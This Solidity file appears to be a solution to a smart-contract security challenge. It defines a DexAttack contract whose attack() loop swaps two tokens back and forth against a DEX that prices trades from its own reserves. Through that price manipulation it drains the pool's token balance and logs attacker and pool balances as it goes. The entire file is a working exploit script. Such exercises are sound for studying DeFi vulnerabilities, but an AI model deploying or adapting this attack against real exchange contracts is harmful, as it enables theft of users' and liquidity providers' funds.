// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

abstract contract IDex {
  address public token1;
  address public token2;

  function swap(address from, address to, uint amount) external virtual;

  function getSwapPrice(
    address from,
    address to,
    uint amount
  ) external view virtual returns (uint);

  function approve(address spender, uint amount) external virtual;

  function balanceOf(
    address token,
    address account
  ) external view virtual returns (uint);
}

contract DexAttack {
  IDex public dex;
  address public token1;
  address public token2;

  constructor(address dexInstance) {
    dex = IDex(dexInstance);
    token1 = dex.token1();
    token2 = dex.token2();
  }

  function attack() public {
    dex.approve(address(dex), 1000);
    while (
      dex.balanceOf(token1, address(dex)) != 0 &&
      dex.balanceOf(token2, address(dex)) != 0
    ) {
      require(
        dex.balanceOf(token1, address(this)) != 0 ||
          dex.balanceOf(token2, address(this)) != 0,
        "No tokens"
      );

      //   console.log(
      //     "allowance",
      //     IERC20(token1).allowance(address(this), address(dex))
      //   );

      uint amount;
      uint swapPrice;

      (address tokenIn, address tokenOut) = dex.balanceOf(
        token1,
        address(this)
      ) > 0
        ? (token1, token2)
        : (token2, token1);

      swapPrice = dex.getSwapPrice(
        tokenIn,
        tokenOut,
        dex.balanceOf(tokenIn, address(this))
      );

      amount = swapPrice > dex.balanceOf(tokenOut, address(dex))
        ? dex.balanceOf(tokenIn, address(dex))
        : dex.balanceOf(tokenIn, address(this));

      dex.swap(tokenIn, tokenOut, amount);

      console.log("Swapped", amount, tokenIn);
      console.log("Dex token1 balance:", dex.balanceOf(token1, address(dex)));
      console.log("Dex token2 balance:", dex.balanceOf(token2, address(dex)));
      console.log(
        "Attacker token1 balance:",
        dex.balanceOf(token1, address(this))
      );
      console.log(
        "Attacker token2 balance:",
        dex.balanceOf(token2, address(this))
      );
    }
  }
}
